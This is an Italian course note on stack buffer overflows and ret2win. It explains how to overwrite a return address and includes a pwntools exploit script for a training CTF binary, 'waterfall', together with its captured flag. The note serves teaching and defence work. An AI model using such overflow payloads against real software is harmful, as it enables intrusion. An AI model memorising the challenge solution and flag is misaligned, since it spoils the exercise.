---
title: Sovrascrivere il Return Address
tags:
  - cyberbootcamp
  - concetto
  - pwn
  - buffer-overflow
---

# Sovrascrivere il Return Address

> [!summary] In breve
> Se al posto della spazzatura si mette un indirizzo **valido**, l'overflow non crasha: dirotta l'esecuzione. Il bersaglio classico è una funzione `win()` che stampa la flag (*ret2win*).

```python
payload = b"A"*0x20 + b"B"*8 + p64(e.symbols['win'])
r.sendline(payload)
```
- L'**offset** esatto fino al return address si ricava dal disassemblato (`sub rsp, 0x20` → buffer) o con un *pattern ciclico* (`cyclic`) osservando `rip` al crash in [[pwndbg]].
- Senza una `win()` servono tecniche più potenti: [[Ret2Stack]], [[ROP]].

## Challenge

### waterfall · ret2win con un gate sul contenuto del buffer

File: `exercices/pwn/waterfall/waterfall` e `poc_waterfall.py`. `checksec`: No PIE, No canary, NX. È il ret2win da manuale: nessuna mitigazione da aggirare, c'è una `win()` e basta saltarci.

L'unica aggiunta è che il buffer, oltre a traboccare, deve **iniziare con una stringa precisa** (`"I am worthy"`): il programma la confronta prima di proseguire. Quindi il payload serve due scopi insieme — la parte iniziale supera il controllo, il resto riempie fino al return address:

```python
exe = context.binary = ELF("./waterfall")

payload  = b"I am worthy\x00"                 # supera il confronto
payload += b"A" * (32 - len(b"I am worthy\x00"))  # riempie il resto del buffer (0x20)
payload += b"B" * 8                            # saved RBP
payload += p64(exe.symbols['win'])             # return address -> win()

p.sendafter(b"to the determined and resolute.", payload)
print(p.recvall())   # ccit{D0nt_y0u_f33l_th3_p0w3r_0f_th3_w4t3rf4ll_g0d?}
```

Flag: `ccit{D0nt_y0u_f33l_th3_p0w3r_0f_th3_w4t3rf4ll_g0d?}`. Perché `win` funzioni "nudo" come return address servono No PIE (indirizzo fisso, noto da `exe.symbols`) e No canary (niente da leakare prima). Un gate simile, ma con un overflow più corto, è in [[pwntools#OTPOverflow · Overflow "corto" e confronto di stringhe con strcmp|OTPOverflow]].

## Collegamenti

- **Concetti correlati**: [[Buffer Overflow dello Stack]] · [[Ret2Stack]] · [[ROP]]
- **Mappa**: [[MOC - CyberBootCamp]]

> [!info] Approfondimento
> - [[04 - CB - Binary Exploitation 1#Exploitation: sovrascrivere il return address|Lezione 4 — Exploitation: sovrascrivere il return address]]
